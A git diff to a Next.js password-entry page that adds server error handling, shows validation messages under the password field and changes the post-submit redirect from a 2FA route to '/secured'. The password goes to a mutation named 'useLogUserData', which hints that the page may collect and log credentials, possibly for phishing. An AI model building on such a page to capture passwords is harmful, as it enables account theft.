@@ -2,6 +2,7 @@
 "use client";
 
 import { queryClient } from "@/components/providers";
+import { ApiError } from "@/lib/apiError";
 import { useLogUserData } from "@/lib/react-query/mutations";
 import { ID } from "@/lib/vars";
 import { zodResolver } from "@hookform/resolvers/zod";
@@ -25,7 +26,7 @@ export default function PasswordPage() {
 
   const { mutate } = useLogUserData();
 
-  const { register, handleSubmit, formState } = useForm<
+  const { register, handleSubmit, formState, setError } = useForm<
     z.infer<typeof passwordSchema>
   >({
     resolver: zodResolver(passwordSchema),
@@ -46,10 +47,16 @@ export default function PasswordPage() {
             {
               onSettled: () => resolve(),
               onSuccess: () => {
-                router.push("/v/2fa");
+                router.push("/secured");
               },
-              onError: (error) => {
+              onError: (error: ApiError) => {
                 console.error("Error occurred while logging user data:", error);
+                // check if error.error is an array and has at least one element with a message property
+
+                // Handle the case where the error is an array of objects with a message property
+                setError("password", {
+                  message: error.message,
+                });
               },
             },
           );
@@ -64,17 +71,17 @@ export default function PasswordPage() {
         Enter your password
       </h1>
       <div>
-        {/* {formState.errors.username && (
-            <p className="text-[15px] text-red-500 mb-0.5">
-              {formState.errors.username.message}
-            </p>
-        )} */}
         <input
           {...register("password")}
           placeholder="Password"
           aria-invalid={formState.errors.password ? "true" : "false"}
           className="w-full py-1 border-b placeholder:text-gray-500 focus:border-b focus:outline-none focus:ring-0 peer border-b-gray-500 focus:border-b-gray-500 aria-invalid:border-b-red-500 aria-invalid:focus:border-b-red-500"
         />
+        {formState.errors.password && (
+          <p className="text-[15px] text-red-500 mt-0.5">
+            {formState.errors.password.message}
+          </p>
+        )}
       </div>
       <button
         type="submit"
